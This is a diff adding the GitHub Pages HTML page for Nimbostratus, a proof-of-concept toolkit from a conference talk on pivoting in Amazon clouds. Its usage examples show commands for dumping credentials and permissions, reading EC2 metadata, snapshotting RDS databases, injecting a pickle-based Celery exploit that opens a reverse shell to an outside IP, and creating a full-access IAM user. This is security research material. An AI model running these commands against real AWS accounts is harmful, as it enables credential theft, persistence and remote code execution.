@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link href='https://fonts.googleapis.com/css?family=Architects+Daughter' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen" />
+    <link rel="stylesheet" type="text/css" href="stylesheets/pygment_trac.css" media="screen" />
+    <link rel="stylesheet" type="text/css" href="stylesheets/print.css" media="print" />
+
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <title>Nimbostratus by andresriancho</title>
+  </head>
+
+  <body>
+    <header>
+      <div class="inner">
+        <h1>Nimbostratus</h1>
+        <h2>Tools for fingerprinting and exploiting Amazon cloud infrastructures</h2>
+        <a href="https://github.com/andresriancho/nimbostratus" class="button"><small>View project on</small>GitHub</a>
+      </div>
+    </header>
+
+    <div id="content-wrapper">
+      <div class="inner clearfix">
+        <section id="main-content">
+          <h1>
+<a name="nimbostratus" class="anchor" href="#nimbostratus"><span class="octicon octicon-link"></span></a>Nimbostratus</h1>
+
+<p>Tools for fingerprinting and exploiting Amazon cloud infrastructures. These tools are a PoC
+which I developed for my "Pivoting in Amazon clouds" talk, developed using the great 
+<a href="https://github.com/boto/boto">boto</a> library for accessing Amazon's API.</p>
+
+<p>Feel free to report bugs, fork and send pull-requests. You can also drop me a line at
+<a href="https://twitter.com/w3af">@w3af</a>.</p>
+
+<h1>
+<a name="installation" class="anchor" href="#installation"><span class="octicon octicon-link"></span></a>Installation</h1>
+
+<div class="highlight"><pre>git clone git@github.com:andresriancho/nimbostratus.git
+<span class="nb">cd </span>nimbostratus
+pip install -r requirements.txt
+</pre></div>
+
+<h1>
+<a name="usage" class="anchor" href="#usage"><span class="octicon octicon-link"></span></a>Usage</h1>
+
+<h2>
+<a name="providing-aws-credentials" class="anchor" href="#providing-aws-credentials"><span class="octicon octicon-link"></span></a>Providing AWS credentials</h2>
+
+<p>Some <code>nimbostratus</code> sub-commands require you to provide AWS credentials. They are
+provided using the following command line arguments:</p>
+
+<ul>
+<li><code>--access-key</code></li>
+<li><code>--secret-key</code></li>
+<li>
+<code>--token</code> , which is only used when the credentials were extracted from the instance profile.</li>
+</ul><h2>
+<a name="dump-credentials" class="anchor" href="#dump-credentials"><span class="octicon octicon-link"></span></a>Dump credentials</h2>
+
+<p>Identify the credentials available in this host and prints them out to the console.
+This is usually the first command to run after gaining access to an EC2 instance.</p>
+
+<div class="highlight"><pre><span class="gp">$</span> nimbostratus dump-credentials
+<span class="go">...</span>
+</pre></div>
+
+<p>Once you've got the credentials from an EC2 instance you've exploited, you can continue to work from any other
+host with internet access (remember: EC2 instances are in many cases spawned for a specific work and then terminated).</p>
+
+<p><em>IMPORTANT</em>: This will extract information from <code>boto</code>'s credential configuration sources
+and from the instance meta-data. If the system uses other libraries to connect to AWS
+the credentials won't be dumped.</p>
+
+<h2>
+<a name="dump-permissions" class="anchor" href="#dump-permissions"><span class="octicon octicon-link"></span></a>Dump permissions</h2>
+
+<p>This tool will dump all permissions for the provided credentials. This tool is commonly used
+right after <code>dump-credentials</code> to know which permissions are available for you.</p>
+
+<div class="highlight"><pre><span class="gp">$</span> nimbostratus dump-permissions --access-key<span class="o">=</span>... --secret-key<span class="o">=</span>...
+<span class="go">...</span>
+</pre></div>
+
+<h2>
+<a name="dump-instance-meta-data" class="anchor" href="#dump-instance-meta-data"><span class="octicon octicon-link"></span></a>Dump instance meta-data</h2>
+
+<p>All EC2 instances have <a href="http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AESDG-chapter-instancedata.html">meta-data</a>
+which is accessible via <a href="http://169.254.169.254/latest/meta-data/">http://169.254.169.254/latest/meta-data/</a>. This
+tool will extract all the important information from the metadata and show it to you.</p>
+
+<p>Keep in mind that each EC2 instance has his own <code>http://169.254.169.254/</code> meta-data
+provider and running this command on different instances will yield different results.</p>
+
+<div class="highlight"><pre><span class="gp">$</span> nimbostratus dump-ec2-metadata
+<span class="go">...</span>
+</pre></div>
+
+<h2>
+<a name="create-db-snapshot" class="anchor" href="#create-db-snapshot"><span class="octicon octicon-link"></span></a>Create DB snapshot</h2>
+
+<p>In some cases you've got Amazon credentials which allow you to access the <a href="http://aws.amazon.com/rds/">RDS</a> API but
+don't have any access to the database itself (MySQL user). This tool allows you to access the information stored in
+that database by creating a snapshot and restoring it.</p>
+
+<div class="highlight"><pre><span class="gp">$</span> nimbostratus snapshot-rds --access-key<span class="o">=</span>... --secret-key<span class="o">=</span>... <span class="se">\</span>
+<span class="go">                            --password=changeme --rds-name==db_name</span>
+<span class="go">...</span>
+</pre></div>
+
+<h2>
+<a name="inject-raw-celery-message" class="anchor" href="#inject-raw-celery-message"><span class="octicon octicon-link"></span></a>Inject raw Celery message</h2>
+
+<p>Celery warns developers about the <a href="http://docs.celeryproject.org/en/latest/userguide/security.html#serializers">insecure pickle</a>
+serialization method, but of course you'll find deployments like this in real life. This tool will check if the instance
+where this tool is being run has access to SQS, if that SQS has a Celery queue, verify that the Queue is using pickle and
+finally inject a raw message that will execute arbitrary commands when un-pickled.</p>
+
+<div class="highlight"><pre><span class="gp">$</span> nimbostratus celery-pickle-exploit --access-key<span class="o">=</span>... --secret-key<span class="o">=</span>... <span class="se">\</span>
+<span class="go">                                     --queue-name=celery --region=ap-southeast-1 \</span>
+<span class="go">                                     --reverse=1.2.3.4:4000</span>
+<span class="go">...</span>
+</pre></div>
+
+<h2>
+<a name="create-new-user" class="anchor" href="#create-new-user"><span class="octicon octicon-link"></span></a>Create new user</h2>
+
+<p>If you've got credentials which allow you to create a new user using <a href="http://aws.amazon.com/iam/">IAM</a> this tool will
+create it (with permissions to access all Amazon resources) and return API key and secret.</p>
+
+<div class="highlight"><pre><span class="gp">$</span> nimbostratus create-iam-user --access-key<span class="o">=</span>... --secret-key<span class="o">=</span>...
+<span class="go">...</span>
+</pre></div>
+
+<h1>
+<a name="whats-a-nimbostratus-anyways" class="anchor" href="#whats-a-nimbostratus-anyways"><span class="octicon octicon-link"></span></a>What's a <code>nimbostratus</code> anyways?</h1>
+
+<p><a href="http://en.wikipedia.org/wiki/Nimbostratus_cloud">nimbostratus</a> is a type of cloud, if you ever started a project you know how hard it is to name it... so I just chose something that sounded "cool" and was "cloud-related".</p>
+        </section>
+
+        <aside id="sidebar">
+          <a href="https://github.com/andresriancho/nimbostratus/zipball/master" class="button">
+            <small>Download</small>
+            .zip file
+          </a>
+          <a href="https://github.com/andresriancho/nimbostratus/tarball/master" class="button">
+            <small>Download</small>
+            .tar.gz file
+          </a>
+
+          <p class="repo-owner"><a href="https://github.com/andresriancho/nimbostratus"></a> is maintained by <a href="https://github.com/andresriancho">andresriancho</a>.</p>
+
+          <p>This page was generated by <a href="pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
+        </aside>
+      </div>
+    </div>
+
+  
+  </body>
+</html>
